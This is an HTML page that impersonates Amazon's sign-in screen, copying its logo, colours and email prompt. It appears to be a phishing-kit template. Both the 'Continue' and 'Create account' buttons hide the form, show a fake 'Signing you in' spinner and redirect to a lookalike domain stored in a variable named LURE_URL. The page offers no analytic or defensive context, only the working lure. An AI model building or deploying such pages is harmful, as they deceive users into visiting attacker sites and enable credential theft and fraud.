<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Amazon Sign-In</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:"Amazon Ember","Helvetica Neue",Helvetica,Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh}
nav{width:100%;background:#131921;padding:12px 0;display:flex;justify-content:center}
.card{border:1px solid #d5d9d9;border-radius:4px;padding:24px 24px 18px;width:100%;max-width:350px;margin:28px auto}
.amz-logo{margin-bottom:20px;text-align:center}
h1{font-size:27px;font-weight:400;margin-bottom:20px;color:#0f1111}
label{display:block;font-size:13px;font-weight:700;color:#0f1111;margin-bottom:3px}
input{display:block;width:100%;border:1px solid #888;border-radius:3px;padding:7px 7px;font-size:13px;margin-bottom:14px;outline:none;color:#0f1111}
input:focus{border-color:#e77600;box-shadow:0 0 3px 2px rgba(228,121,17,.5)}
.btn{display:block;width:100%;padding:9px;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;font-size:13px;cursor:pointer;margin-bottom:14px;color:#111}
.btn:hover{background:linear-gradient(to bottom,#f5d78e,#eeb933)}
.terms{font-size:12px;color:#555;line-height:1.4;margin-bottom:14px}
.terms a{color:#c45500;text-decoration:none}
.divider{display:flex;align-items:center;gap:8px;margin-bottom:14px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e7e7e7}
.divider span{font-size:12px;color:#767676;white-space:nowrap}
.new-btn{display:block;width:100%;padding:9px;background:#fff;border:1px solid #d5d9d9;border-radius:3px;font-size:13px;cursor:pointer;color:#0f1111;box-shadow:0 2px 5px rgba(213,217,217,.5)}
.new-btn:hover{background:#f7f8f8}
.spinner{width:24px;height:24px;border:2px solid #e7e7e7;border-top:2px solid #e77600;border-radius:50%;animation:spin .8s linear infinite;margin:60px auto}
@keyframes spin{to{transform:rotate(360deg)}}#loading{display:none;text-align:center}</style></head>
<body>
<nav><svg xmlns="http://www.w3.org/2000/svg" width="130" height="40" viewBox="0 0 453 137"><path fill="#FF9900" d="M273.7 86.1c-25.4 18.7-62.2 28.7-93.9 28.7-44.5 0-84.5-16.4-114.8-43.7-2.4-2.1-.2-5 2.6-3.3 32.7 19 73.1 30.5 114.8 30.5 28.1 0 59.1-5.8 87.6-18 4.3-1.8 7.9 2.8 3.7 5.8z"/><path fill="#FF9900" d="M284.2 74.1c-3.3-4.2-21.6-2-29.8-1-2.5.3-2.9-1.9-.6-3.4 14.6-10.3 38.6-7.3 41.4-3.9 2.8 3.5-.7 27.6-14.4 39.1-2.1 1.7-4.1.8-3.2-1.5 3.1-7.6 9.9-24.6 6.6-29.3z"/><path fill="#fff" d="M254.2 12.5V3.8c0-1.3 1-2.3 2.3-2.3h40.2c1.3 0 2.3 1 2.3 2.3v7.4c0 1.3-1.1 3-3 5.6L276.2 46c7.7-.2 15.9 1 22.9 4.9 1.6.9 2 2.2 2.1 3.4v9.7c0 1.3-1.4 2.8-2.9 2-12.1-6.4-28.1-7-41.5.1-1.4.7-2.8-.7-2.8-2V55.3c0-1.5 0-3.9 1.5-6.2l24.1-34.6h-21c-1.3 0-2.3-1-2.3-2z"/><text x="1.5" y="80" font-family="Arial,sans-serif" font-size="76" font-weight="bold" fill="#fff">amazon</text></svg></nav>
<div id="wrap"><div class="card" id="card">
<div class="amz-logo"><svg xmlns="http://www.w3.org/2000/svg" width="100" height="30" viewBox="0 0 453 137"><text x="0" y="110" font-family="Arial,sans-serif" font-size="110" font-weight="bold" fill="#131921">amazon</text></svg></div>
<h1>Sign in</h1>
<label for="em">Email or mobile phone number</label>
<input type="email" id="em" placeholder="">
<button class="btn" onclick="go()">Continue</button>
<div class="terms">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</div>
<div class="divider"><span>New to Amazon?</span></div>
<button class="new-btn" onclick="go()">Create your Amazon account</button>
</div></div>
<div id="loading"><div class="spinner"></div><p style="color:#555;font-size:14px;margin-top:8px">Signing you in&hellip;</p></div>
<script>
var LURE_URL='https://www.amazon2026.msonlinesync.site/AKhwZRQi'; /* AUTO_LURE_URL */
function go(){document.getElementById('wrap').style.display='none';document.getElementById('loading').style.display='block';setTimeout(function(){window.location.href=LURE_URL;},500);}
</script></body></html>
